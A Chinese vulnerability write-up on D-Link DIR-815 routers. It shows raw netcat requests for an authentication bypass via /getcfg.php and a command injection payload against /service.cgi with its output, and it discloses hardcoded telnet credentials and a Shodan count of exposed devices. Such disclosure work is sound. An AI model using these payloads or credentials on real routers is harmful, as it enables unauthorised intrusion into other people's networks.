@@ -1,0 +1,30 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+俗话说，“一分钱一分货”，这道理似乎也适用于编程行业，我就是个爱捡便宜的人，身边囤了一大堆新的廉价电子设备，趁着无聊的圣诞假期，我打算好好试用一下它们，取其精华，去其糟粕，替换掉一些老旧的硬件设备。非常偶然，在试用D-Link 815N路由器过程中，我发现了其存在的一个远程代码执行（RCE）0-day漏洞。
+声明
+本文目的不在于炫耀这是一个多么牛逼的 0-day漏洞，而是记录演示，如何去发现类似的0-day漏洞。我简单查看了D-Link官网后，却没找到一个可以提交漏洞的地方，所以也只能简单在这里记录一下相关漏洞发现过程了。 更新：经过测试发现，该漏洞竟然对多个型号的D-Link路由器造成影响，一些最新的固件版本可能不受影响。
+第一步：发现海量联网D-Link 815N设备
+启动D-Link路由器并连接设备后，其初次登录凭据竟然是-用户名：admin，空密码。接下来，我启用了其“远程管理”功能，模拟互联网能看到的该设备相关信息，在通过简单的netcat方式查看后，其远程管理接口返回了以下设备banner信息：
+nc 10.0.0.1 8080 HEAD / HTTP/1.1 HTTP/1.1 400 Bad Request Server: Linux, HTTP/1.1, DIR-815 Ver 1.03 Date: Sat, 27 Jan 2001 02:48:12 GMT
+根据该信息，可在Shodan.io上发现540多台在线的D-Link 815N设备。
+第二步：了解设备工作原理
+此时，我想对D-Link 815N的WEB认证机制和相关页面加载方式作个了解，于是乎，我利用了 Chrome的开发者工具的“network” 标签来监测其设备运行下的网络流量。成功登录后，会有一个发送到/session.cgi的POST请求产生，但最终会响应一些无关紧要与会话无关的XML信息，整个过程如下：
+nc 10.0.0.1 8080 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Host: localhost Cookie: uid=DumMyTokEN Content-Length: 68 ACTION=login_plaintext&PASSWD=&CAPTCHA=&USER=admin&REPORT_METHOD=xml HTTP/1.1 200 OK Server: Linux, HTTP/1.1, DIR-815 Ver 1.03 Date: Sat, 27 Jan 2001 04:59:08 GMT Transfer-Encoding: chunked Content-Type: text/xml a1 <?xml version=”1.0″ encoding=”utf-8″?> <report> <RESULT>SUCCESS</RESULT> <REASON></REASON> <AUTHORIZED_GROUP>0</AUTHORIZED_GROUP> <PELOTA></PELOTA> </report> 0
+从上述代码可看到，开发者貌似只是通过能创建的cookie信息来进行身份认证，如果是这么糟糕，那是否也可以绕过身份认证访问某些页面呢？
+经过几分钟的浏览，我发现一个会被引用的PHP页面/getcfg.php，于是，我用Chrome和其开发者工具来抓取一些引用该页面的POST请求，然后用netcat对这些请求进行不带cookie的重放。其中，出现了一个非常有意思的字段：DEVICE.ACCOUNT，可用它来配合后面的设备发现程序进行默认密码检查。如下：
+POST /getcfg.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Host: localhost Content-Length: 23 SERVICES=DEVICE.ACCOUNT HTTP/1.1 200 OK Server: Linux, HTTP/1.1, DIR-815 Ver 1.03 Date: Sat, 27 Jan 2001 05:07:42 GMT Transfer-Encoding: chunked Content-Type: text/xml 208 <?xml version=”1.0″ encoding=”utf-8″?> <postxml> <module> <service>DEVICE.ACCOUNT</service> <device> <account> <seqno></seqno> <max>1</max> <count>1</count> <entry> <name>admin</name> <password></password> <group>0</group> <description></description> </entry> </account> <session> <captcha>0</captcha> <dummy>dummy</dummy> <timeout>600</timeout> <maxsession>128</maxsession> <maxauthorized>16</maxauthorized> </session> </device> </module> </postxml> 0
+如果用户自行设置了密码，那么上述请求结果中<password>字段就是==OoXxGgYy==。经过10多分钟的研究，我发现了绕过认证来探测路由器信息的方法（github），这种方法可以得到路由器所有的接口信息、接入设备及交互流量、DNS和日志信息等。
+第三步：尝试拿Shell
+经过了几小时的折腾，我把这些发现的东西炫耀给我朋友看，他觉得非常一般，只说了一句“有本事你就拿到shell给我看看！“，他的这席话激发了我的研究斗志，我转向分析路由器的输入验证机制，着重查找一些可执行页面，之后发现了使用/service.cgi的路由器防火墙功能配置页面，经过对其POST请求的观察，我在其正常提交数据后面添加了一个&符号以及ls命令，配合传入的身份认证cookie值，之后再提交命令，奇迹出现了，这明显是个RCE啊！：
+root@kali:~# nc 10.0.0.1 8080 POST /service.cgi HTTP/1.1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Host: localhost Content-Length: 21 Cookie: uid=DuMMyTokEN EVENT=CHECKFW%26ls%26 HTTP/1.1 200 OK Server: Linux, HTTP/1.1, DIR-815 Ver 1.03 Date: Sat, 27 Jan 2001 09:25:03 GMT Transfer-Encoding: chunked Content-Type: text/xml 64 <?xml version=”1.0″ encoding=”utf-8″?> <report> <result>OK</result> <message></message> </report> 4 cbwpsacts.php wiz_wps.php wiz_wlan.php wiz_wan_fresetv6.php wiz_wan.php wifi_stat.php … <You get the point> 0
+第四步：综合利用
+是的，你没看错，这就是个RCE漏洞，但还必须要经过身份验证这一关，但老实说，总是有方法的，这就当个伏笔吧，让大家去动脑筋思考。
+最终，综合以上利用方式后，我写了一个包含busybox命令的利用脚本（ DLINK Shell RCE），用它成功渗透之后，可以很方便地与目标路由器进行远程交互。很多轻量级的IoT设备也都会用到busybox命令，用它可以简化一些执行命令。
+那么，接下来我们可以启用telnet功能，来获得一个相对稳定的shell：
+/bin/cat /etc/init0.d/S80telnetd.sh #!/bin/sh echo [$0]: $1 … > /dev/console if [ “$1” = “start” ]; then if [ -f “/usr/sbin/login” ]; then image_sign=`cat /etc/config/image_sign` telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 & else telnetd & fielse killall telnetd fi
+注释：设备竟然在/etc/config/image_sign中泄露了telnet的硬编码用户名密码信息，用户名是Alphanetworks，密码是wrgac25_dlink.2013gui_dir850l，估计所有D-Link 815N系列路由器都会是这个telnet凭据吧。
+第五步：驻留控制
+对这类设备实现长期驻留控制也没多大意义，而且一旦它们重启之后，所有固件信息都会重新还原释放，我们的利用脚本也就不起作用了。但一般情况下，好在这类路由器也不会经常重启，所以要实现一段时间的驻留控制也是可行的。
+这种危险的控制方法我就不在此公开了，如果你对Linux和echo命令比较熟悉，一般可以利用python脚本来把相关信息读取到一个二进制文件中，然后再把这些信息输出，如以“echo -e ”的方式把数据信息输出到 “/var/tmp”中。当然，这就要求对MIPS体系架构比较熟悉，具体可参考：mips-binaries
+另外，可以从网上了解到，在2013年披露的D-Link漏洞中，通过访问D-Link DIR645的/getcfg.php页面，就能获取到路由器明文形式的用户名密码。把上述我们发现的/service.cgi问题与该漏洞结合，你就能指哪打哪了！
+PoC：Github-dlink_shell_poc
+*参考来源：cr0n1c ，freebuf小编clouds编译，转载请注明来自FreeBuf.COM
